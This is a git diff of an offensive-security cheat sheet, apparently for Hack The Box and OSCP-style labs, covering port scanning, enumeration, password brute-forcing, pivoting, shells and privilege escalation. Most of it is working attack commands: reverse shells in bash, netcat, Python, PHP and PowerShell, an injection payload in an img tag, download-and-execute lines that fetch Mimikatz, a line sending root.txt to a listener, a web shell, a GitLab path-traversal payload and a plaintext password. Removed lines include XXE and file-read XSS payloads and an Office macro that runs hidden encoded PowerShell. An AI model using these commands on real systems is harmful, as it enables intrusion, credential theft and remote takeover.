@@ -1,30 +1,40 @@
+[TOC]
+
+
+
 # Discovery
 
-### General
-
-```shell
-./lazyrecon.sh -d indeed.com
-
-
-./dirsearch.py -u https://thehub.buzzfeed.com/ -e php,asp,txt -t 40
-```
-
-### NMAP
+### PORT SCAN
 
 ```bash
+#NMAP
 nmap -sC -sV -oA name <ip>
 #NMAP SCRIPTS
 nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
 nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
+#Mascan
+masscan -sS --ports 0-65535 192.168.23.109 -e tun1
+```
 
+# Enumeration
 
-masscan -sS --ports 0-65535 10.10.10.209 -e utun2
+### WEB
+
+```bash
+$ ./dirsearch.py -u https://thehub.buzzfeed.com/ -e php,asp,txt -t 40
+$ ffuf -c -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://worker.htb/ -H “Host: FUZZ.worker.htb” -fs 185
+$ gobuster dir -u bank.htb -w /usr/share/wordlists/dirb/common.txt
+```
+
+### GIT Leak
+
+```bash
+root@kali:~/tools/GitTools/Dumper# ./gitdumper.sh https://source.cereal.htb/.git/ ../out/
+root@kali:~/tools/GitTools/Dumper# ./Extractor/extractor.sh ./out/ ./out_code/
 ```
 
 # Passwords
-
-## Brute-Force
 
 ### Crowbar - rdp
 
@@ -43,10 +53,12 @@ hydra -L user.txt -P passwords.txt ssh://127.0.0.1
 
 
 
-### Hydra - POST
+### Hydra - WEB
 
 ```bash
-hydra 10.11.0.22 http-form-post "/form/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+$ hydra 10.11.0.22 http-form-post "/form/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.10.209 -s 8089 http-head /services -S -F
 ```
 
 
@@ -67,7 +79,7 @@ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR
 
 
 
-## mimikatz.exe
+### mimikatz.exe
 
 ```
 C:\> C:\temp\mimikatz.exe
@@ -78,9 +90,7 @@ mimikatz # lsadump::sam
 
 
 
-## Cracking
-
-### Hash identification
+### Cracking
 
 ```bash
 hashid 'HASH_HERE'
@@ -100,6 +110,7 @@ john --show id_rsa.hash
 
 ```bash
 pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd
+
 ```
 
 
@@ -132,7 +143,7 @@ $ smbclient -L 127.0.0.1 -U Administrator
 
 ```bash
 $ ssh -N -R [bind_address:]port:host:hostport [username@address]
-$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
+$ ssh -N -R 10.10.10.212:4566:127.0.0.1:4566 karoyli@10.10.10.212
 #Any traffic on 10.11.0.4:2221 will be forwarded to 127.0.0.1:3306 (ssh client) over SSH Tunnel
 ```
 
@@ -178,6 +189,7 @@ dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.14
 * #### portfwd
 
 ```
+portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
 meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
 ```
 
@@ -199,31 +211,30 @@ ruby -run -e httpd . -p 9000
 busybox httpd -f -p 10000
 ```
 
-
-
 # Shell
 
 ### Bash
 
 ```shell
 #!/bin/bash
-/bin/bash -c "bash &>/dev/tcp/10.10.16.104/4444 <&1"
+/bin/bash -c "/bin/bash &>/dev/tcp/10.10.16.86/443 <&1"
 
-/bin/sh -i >& /dev/tcp/10.10.16.104/4444 0>&1
+/bin/sh -i >& /dev/tcp/10.10.16.86/4433 0>&1
+
+<img src=http://10.10.14.ip/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.16.37'$IFS'443')>
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 ```
-
-
 
 ### nc
 
 ```shell
-/bin/nc -e /bin/sh 10.10.16.104 4444
-ncat 10.10.14.41 3344 -e /bin/bash
-/bin/nc 10.10.16.104 4444 < /root/root.txt
-rm /tmp/fo;mkfifo /tmp/fo;cat /tmp/fo|/bin/sh -i 2>&1|nc 10.10.16.104 443 >/tmp/fo
+/bin/nc -e /bin/sh 10.10.16.37 443
+/bin/nc 10.10.16.31 443 -e /bin/bash
+/bin/nc 10.10.16.31 4444 < /root/root.txt
+rm /tmp/fo;mkfifo /tmp/fo;cat /tmp/fo|/bin/sh -i 2>&1|nc 10.10.16.31 443 >/tmp/fo
 ```
-
-
 
 ### Socat
 
@@ -288,23 +299,15 @@ powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps1
 powershell.exe -E <encoded>
 ```
 
-
-
 ### php
 
 ```php
 GIF89a
 <?php echo system($_GET); ?>
-<?php exec("nc 192.168.119.122 80 -e cmd.exe")?>
+<?php exec("nc 10.10.16.86 443 -e bash")?>
   
 /bin/php -r '$sock=fsockopen("10.10.16.104",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-
-```bash
-
-```
-
-
 
 ### java
 
@@ -312,15 +315,13 @@ GIF89a
 echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-
-
 ### python
 
 ```python
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.37",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 
@@ -337,70 +338,7 @@ find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
 
 ```
 use exploit/windows/misc/hta_server
-mshta.exe http://10.211.55.5:80/Q1laPNj1.hta
-```
-
-
-
-# Web
-
-### Dir-search
-
-```
-dirsearch -u URL -e php -x 403
-```
-
-
-
-### XXE
-
-```
-<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.109:8000/"> ]> 
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
-```
-
-
-
-### SSRF XSS
-
-```html
-<script>function naser(){x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();}</script>
-
-<iframe id="myFrame" src="file:///../../index.php"></iframe>
-
-<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
-  
-<script>
-x=new XMLHttpRequest;x.onload=function({document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>script>
-```
-
-
-
-### SQLMAP
-
-```shell
-sqlmap -r exp.txt -p productName --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows 
-
-sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-read=C:\\inetpub\\wwwroot\\index.php
-
-sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-write=/root/Desktop/scripts/powny_shell.php --file-dest=C:\\inetpub\\wwwroot
-```
-
-
-
-### Subdomain
-
-```
-subjack -w ss.txt -t 100 -timeout 30 -o results.txt -ssl -v
-python takeover.py -d domain.com -w wordlist.txt -t 20
-```
-
-
-
-### code auditing
-
-```
-./scripts/cobra.py -t <code_folder>
+mshta.exe http://10.10.10.204:80/IXhduoRTQtPZ.hta
 ```
 
 
@@ -415,7 +353,7 @@ enum4linux -a IP
 Get-Service
 netstat -aon | find /i "listening"
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.16.104:8000/accesschk64.exe','./ack.exe')
+(new-object System.Net.WebClient).DownloadFile('http://10.10.16.125/winPEAS.bat','.\winPEAS.bat')
 
 
 net user pwn
@@ -427,22 +365,28 @@ runas /user:pwn\Administrator cmd.exe
 ### powershell
 
 ```powershell
-powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.119.122:8000/mimikatz.exe','mimikatz.exe')
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.125/GenericPotato.exe','.\GenericPotato.exe')
+
+/c powershell Invoke-Webrequest -OutFile C:\temp\peas.bat -Uri http://10.10.16.37:8000/winPEAS.bat ” –v
+ 
+iex(new-object net.webclient).downloadstring('http://10.10.16.125:8000/Invoke-Mimikatz.ps1')
 
 powershell.exe -nop -w hidden -e <BASE64-UTF-16>
 
-$user = "pwn\"
-$pass = "o" | ConvertTo-SecureString -AsPlainText -Force
+Enter-PSSession -ComputerName 10.10.16.125 -credential @Cred -Authentication Negotiate
+
+$user = "app\"
+$pass = "mesh5143" | ConvertTo-SecureString -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$pass
-Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe "/c C:\inetpub\wwwroot\uploads\nc.exe -e powershell.exe 10.10.16.104 4444" } 
+Invoke-Command -Computer htb.local -Credential $cred -ScriptBlock { cmd.exe "/c C:\Users\henry.vinson_adm\Documents\nc64.exe -e powershell.exe 10.10.16.125 4444"} 
 
 C:\Users\shaun\Documents\nc.exe 10.10.16.31 8080 -e powershell.exe
 
 
 reverse_shell
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.122',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.86',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
 
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.6',3344);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.86',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
 
@@ -503,6 +447,7 @@ works the same as a command line FTP client, may browse files without even havin
 
 ```bash
 smbmap -H 192.168.1.13 -R -u Nadine -p L1k3B1gBut7s@W0rk
+smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
 nmblookup -A 10.10.10.151
 nbtscan 10.10.10.185
 
@@ -511,7 +456,11 @@ mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=
 smbclient -N -L 10.10.10.169
 smbclient -N -L 10.10.10.175 -U EGOTISTICALBANK/administrator
 smbclient \\\\<targetip>\\ShareName
-smbclient \\\\<targetip>\\ShareName -U john
+
+#smbclient \\\\<targetip>\\ShareName -U john
+#smb: \> recurse ON
+#smb: \> prompt OFF
+#smb: \> mget *
 
 spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>
 
@@ -543,9 +492,17 @@ rpcclient $> srvinfo
 rpcclient $> enumdomusers
 rpcclient $> enumalsgroups domain
 rpcclient $> lookupnames administrators
+rpcclient $> querydispinfo
 rpcclient> querydominfo
 rpcclient> enumdomusers
 rpcclient> queryuser john
+rpcclient> enumprinters
+```
+
+
+
+```bash
+# crackmapexec smb fuse.fabricorp.local -u users.txt -p "Fabricorp01"
 ```
 
 
@@ -580,7 +537,7 @@ nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
 
 ```
 searchsploit linux kernel 2.6 | grep 'Cent'
-gcc -m32 -Wall -o exploit 9542.c -Wl,--hash-style=both
+gcc -m32 -Wall -o exploit exp.c -Wl,--hash-style=both
 
 
 .\ack.exe "Administrator" -Kvuqw hklm\system\CurrentControlSet\services
@@ -593,51 +550,6 @@ reg query "HKLM\system\CurrentControlSet\services\3ware" /v "ImagePath"
 
 
 
-```
-
-
-
-### Macro
-
-```
-Sub AutoOpen()
-    Shell
-End Sub
-Sub Document_Open()
-    Shell
-End Sub
-Sub Shell()
-		Dim Str As String
-    Str = Str + "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ"
-    Str = Str + "QByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA"
-    Str = Str + "6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9A"
-    Str = Str + "FsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGM"
-    Str = Str + "AbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABvAD0Ab"
-    Str = Str + "gBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwB"
-    Str = Str + "sAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlA"
-    Str = Str + "HQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGY"
-    Str = Str + "AYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAc"
-    Str = Str + "wAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAG8ALgBwAHIAbwB"
-    Str = Str + "4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdA"
-    Str = Str + "DoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHk"
-    Str = Str + "AKAApADsAJABvAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4Ad"
-    Str = Str + "ABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQB"
-    Str = Str + "hAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByA"
-    Str = Str + "GUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4"
-    Str = Str + "AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAb"
-    Str = Str + "ABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQB"
-    Str = Str + "uAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuA"
-    Str = Str + "DEAMQA5AC4AMQAyADIALwA5AHoAZwBMAFYAegBoAFQAVwBTADE"
-    Str = Str + "AUABDAE0ALwAwAEYAZABCAG8AbABkAFkAJwApACkAOwBJAEUAW"
-    Str = Str + "AAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgB"
-    Str = Str + "XAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkA"
-    Str = Str + "FMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4"
-    Str = Str + "AMQA2ADgALgAxADEAOQAuADEAMgAyAC8AOQB6AGcATABWAHoAa"
-    Str = Str + "ABUAFcAUwAxAFAAQwBNACcAKQApADsA"
-    
-    CreateObject("Wscript.Shell").Run Str
-
-End Sub
 ```
 
 
@@ -660,6 +572,10 @@ sudo restic -r rest:http://10.10.15.203:8000/ backup /root/root.txt --password-f
 
 FTP:
  wget -r ftp://anonymous:anonymous@servmon.htb/
+ 
+ 
+#gitlab lfi
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/VERSION)
 ```
 
 
@@ -673,4 +589,6 @@ FTP:
 [Crack](https://crackstation.net/)
 
 [CyberChef](https://gchq.github.io/CyberChef/)
+
+
 
